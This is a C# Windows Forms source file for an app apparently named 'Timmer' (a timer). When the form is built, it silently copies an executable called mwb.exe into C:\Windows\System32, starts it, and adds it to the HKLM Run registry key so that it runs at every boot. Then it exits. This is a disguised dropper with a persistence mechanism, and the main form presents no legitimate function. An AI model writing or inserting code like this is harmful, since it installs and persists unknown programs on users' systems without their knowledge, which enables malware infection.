using System;
using System.Diagnostics;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;



using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;

using System.Net;

namespace Timmer
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Copymyself();
            Runmwb();
            SetAutoRun();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        public void SetAutoRun()
        {
            textBox1.Text += "setauto start" + Environment.NewLine;
            //获得文件的当前路径 
            string dir = Directory.GetCurrentDirectory();
            string exeDir = "\"C:\\Windows\\System32\\mwb.exe\"";

            RegistryKey reg = null;
            reg = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (reg == null)
            {
                reg = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
            }
            reg.SetValue("mwb", exeDir);
            reg.Close();

            Closeme();
            //Application.Exit();
            //Environment.Exit(0);
            textBox1.Text += "setauto over" + Environment.NewLine;
        }
        public void Closeme()
        {
            Environment.Exit(0);
        }
        public void Runmwb()
        {
            textBox1.Text += "run start" + Environment.NewLine;
            Process.Start(@"C:\Windows\System32\mwb.exe");
            textBox1.Text += "run over" + Environment.NewLine;
        }
        private  void Copymyself()
        {
            textBox1.Text += "copy start" + Environment.NewLine;
            string fileName = "mwb.exe";
            string sourcePath = Directory.GetCurrentDirectory();
            string targetPath = @"C:\\Windows\\System32\\";
            string sourceFile = System.IO.Path.Combine(sourcePath, fileName);
            string destFile = System.IO.Path.Combine(targetPath, fileName);
            if (!System.IO.Directory.Exists(targetPath))
            {
                System.IO.Directory.CreateDirectory(targetPath);
            }
            System.IO.File.Copy(sourceFile, destFile, true);
            textBox1.Text += "copy over" + Environment.NewLine;
        }


       
    }
}
